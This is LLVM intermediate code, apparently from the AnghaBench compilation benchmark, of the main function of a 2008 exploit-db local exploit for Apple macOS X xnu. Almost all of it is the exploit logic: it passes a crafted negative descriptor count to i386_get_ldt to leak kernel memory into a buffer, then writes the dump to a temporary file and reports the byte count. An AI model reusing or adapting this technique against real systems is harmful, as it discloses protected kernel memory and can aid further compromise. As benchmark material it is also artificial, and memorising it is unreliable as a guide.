; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_8108.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_8108.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%union.ldt_entry = type { i32 }

@.str = private unnamed_addr constant [137 x i8] c"Apple MACOS X xnu <= 1228.x local kernel memory disclosure\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2008!@$!\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"failed i386_get_ldt(): %d\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [28 x i8] c"i386_get_ldt: num_desc: %d\0A\00", align 1
@TMP_FILE = common dso_local global i8* null, align 8
@O_CREAT = common dso_local global i32 0, align 4
@O_RDWR = common dso_local global i32 0, align 4
@S_IRUSR = common dso_local global i32 0, align 4
@S_IWUSR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [19 x i8] c"failed open(): %d\0A\00", align 1
@READ_SIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [15 x i8] c"failed mmap()\0A\00", align 1
@.str.5 = private unnamed_addr constant [41 x i8] c"%d-bytes of kernel memory dumped to: %s\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str, i64 0, i64 0))
  %11 = call i32 @i386_get_ldt(i32 0, i32 1, i32 0)
  store i32 %11, i32* %7, align 4
  %12 = load i32, i32* %7, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i32, i32* @stderr, align 4
  %16 = load i32, i32* %7, align 4
  %17 = call i32 (i32, i8*, ...) @fprintf(i32 %15, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i32 %16)
  %18 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %18, i32* %3, align 4
  br label %80

19:                                               ; preds = %2
  %20 = load i32, i32* %7, align 4
  store i32 %20, i32* %8, align 4
  %21 = load i32, i32* %8, align 4
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0), i32 %21)
  %23 = load i8*, i8** @TMP_FILE, align 8
  %24 = load i32, i32* @O_CREAT, align 4
  %25 = load i32, i32* @O_RDWR, align 4
  %26 = or i32 %24, %25
  %27 = load i32, i32* @S_IRUSR, align 4
  %28 = load i32, i32* @S_IWUSR, align 4
  %29 = or i32 %27, %28
  %30 = call i32 @open(i8* %23, i32 %26, i32 %29)
  store i32 %30, i32* %6, align 4
  %31 = load i32, i32* %6, align 4
  %32 = icmp slt i32 %31, 0
  br i1 %32, label %33, label %38

33:                                               ; preds = %19
  %34 = load i32, i32* @stderr, align 4
  %35 = load i32, i32* %6, align 4
  %36 = call i32 (i32, i8*, ...) @fprintf(i32 %34, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i32 %35)
  %37 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %37, i32* %3, align 4
  br label %80

38:                                               ; preds = %19
  %39 = load i32, i32* @READ_SIZE, align 4
  %40 = load i32, i32* @PROT_READ, align 4
  %41 = load i32, i32* @PROT_WRITE, align 4
  %42 = or i32 %40, %41
  %43 = load i32, i32* @MAP_ANON, align 4
  %44 = load i32, i32* @MAP_PRIVATE, align 4
  %45 = or i32 %43, %44
  %46 = call i8* @mmap(i32* null, i32 %39, i32 %42, i32 %45, i32 -1, i32 0)
  store i8* %46, i8** %9, align 8
  %47 = load i8*, i8** %9, align 8
  %48 = ptrtoint i8* %47 to i32
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %54

50:                                               ; preds = %38
  %51 = load i32, i32* @stderr, align 4
  %52 = call i32 (i32, i8*, ...) @fprintf(i32 %51, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0))
  %53 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %53, i32* %3, align 4
  br label %80

54:                                               ; preds = %38
  %55 = load i8*, i8** %9, align 8
  %56 = load i32, i32* @READ_SIZE, align 4
  %57 = call i32 @memset(i8* %55, i32 0, i32 %56)
  %58 = load i32, i32* %8, align 4
  %59 = sub nsw i32 %58, 1
  %60 = load i8*, i8** %9, align 8
  %61 = bitcast i8* %60 to %union.ldt_entry*
  %62 = ptrtoint %union.ldt_entry* %61 to i32
  %63 = load i32, i32* %8, align 4
  %64 = sub nsw i32 %63, 1
  %65 = sub nsw i32 0, %64
  %66 = call i32 @i386_get_ldt(i32 %59, i32 %62, i32 %65)
  %67 = load i32, i32* %6, align 4
  %68 = load i8*, i8** %9, align 8
  %69 = load i32, i32* @READ_SIZE, align 4
  %70 = call i32 @write(i32 %67, i8* %68, i32 %69)
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %9, align 8
  %72 = load i32, i32* @READ_SIZE, align 4
  %73 = call i32 @munmap(i8* %71, i32 %72)
  %74 = load i32, i32* %6, align 4
  %75 = call i32 @close(i32 %74)
  %76 = load i32, i32* %7, align 4
  %77 = load i8*, i8** @TMP_FILE, align 8
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.5, i64 0, i64 0), i32 %76, i8* %77)
  %79 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %79, i32* %3, align 4
  br label %80

80:                                               ; preds = %54, %50, %33, %14
  %81 = load i32, i32* %3, align 4
  ret i32 %81
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @i386_get_ldt(i32, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i8* @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @munmap(i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
